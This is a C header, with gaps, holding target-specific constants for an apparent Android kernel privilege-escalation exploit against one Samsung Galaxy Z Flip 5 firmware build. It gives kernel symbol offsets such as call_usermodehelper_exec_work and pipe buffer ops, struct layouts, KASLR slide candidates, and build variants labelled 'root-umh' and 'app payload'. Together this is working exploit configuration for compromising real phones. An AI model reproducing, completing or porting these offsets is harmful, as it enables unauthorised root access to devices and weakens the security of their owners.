...
/*
 * SM-F731U (Galaxy Z Flip 5, SM8550) / F731USQS6FZA1
 * Kernel: 5.15.178-android13-8-31998796-abF731USQS6FZA1
 * Image SHA-256: 33bce723053b0a1f3140f2c6facc10f0398c89381c736c0a418b69ca772b40e0
 *
 * Symbol offsets: vmlinux-to-elf on the exact boot.img kernel.
 * Struct layouts: raw BTF extracted from the same Image (5959221 bytes,
 * size cross-checked against on-device /sys/kernel/btf/vmlinux).
 * SLIDE_TRACEFS_EVENT_ID read live from the device: 108.
 */

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "f731u-F731USQS6FZA1-app"
#define APP_PHYS_P0_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "f731u-F731USQS6FZA1-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
 "samsung/b5qsqw/b5q:16/BP2A.250605.031.A3/F731USQS6FZA1:user/release-keys"
#endif

/* slabinfo: mm_struct objsize(stride)=1024, objperslab=32, pagesperslab=8 */
#define MM_STRUCT_SZ 0x400ULL
#define MM_ORDER 3
...
/* task_struct (BTF): usage=0x38 prio=0x7c normal_prio=0x84 sched_task_group=0x400
...
#define KMALLOC_CACHES_OFF        0x01f9d998ULL
#define ANON_PIPE_BUF_OPS_OFF     0x01dc8120ULL
#define SYSTEM_UNBOUND_WQ_OFF     0x02990800ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00104160ULL

#define ASHMEM_FOPS_OFF           0x01f46de0ULL
/* ashmem_misc(0x02af2798) + offsetof(miscdevice, fops)=0x10 */
...
/* live /sys/kernel/tracing/events/sched/sched_blocked_reason/id; matches
 * __TRACE_LAST_TYPE(20) + (__event_sched_blocked_reason-__start_ftrace_events)/8(=88) */
#define SLIDE_TRACEFS_EVENT_ID 108
/* instruction after `bl schedule` in worker_thread (0xffffffc00810d6e8) */
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0010d6ecULL
/* same 5.15 layout family as dm3q; TODO verify from do_pselect disasm */
/* derived: waiter words 0-10 within 15-qword logical fdsets; see docs/SM-S921B */
...
#define SLIDE_P0_OFFSET_CANDIDATES \
 ...
 0x1e0000ULL, 0x1e8000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 63

/* nfulnl_logger.name -> "nfnetlink_log" @ 0xffffffc009cbad67 */
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01cbad67ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02991e48ULL
/* random_table[] "boot_id" entry .data slot; value == sysctl_bootid storage */
...
#define P0_FINGERPRINT_HEADER "targets/f731u-F731USQS6FZA1/p0_fingerprint.h"
#endif
...
/* rt_mutex_waiter (BTF, identical to 5.15.189 dm3q) */
...
/* task_struct members (BTF of this exact kernel) */
...
/* configfs_buffer (BTF): needs_read_fill=0x50 bin_buffer=0x58 bin_buffer_size=0x60 */
...
/* worker_pool (BTF): worklist=0x20 nr_idle=0x34 (differs from dm3q!) */
...
/* file_operations (BTF, size 0x120) */
